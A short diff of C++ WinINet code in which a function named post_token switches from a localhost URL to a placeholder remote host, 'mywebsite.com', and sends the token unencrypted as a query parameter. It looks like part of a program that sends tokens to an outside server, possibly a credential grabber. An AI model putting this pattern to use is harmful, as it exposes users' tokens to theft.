@@ -62,7 +62,7 @@ void post_token(string token) {
 	HINTERNET retFile;
 	string rtn;
 	if (wbNet) {
-		retFile = InternetOpenUrlA(wbNet, ("http://localhost:801/token/post.php?t="+token).c_str(), NULL, NULL, NULL, NULL);
+		retFile = InternetOpenUrlA(wbNet, ("http://mywebsite.com/token/post.php?t="+token).c_str(), NULL, NULL, NULL, NULL);
 		if (retFile) {
 			char buffer[2000];
 			DWORD bytesRead;
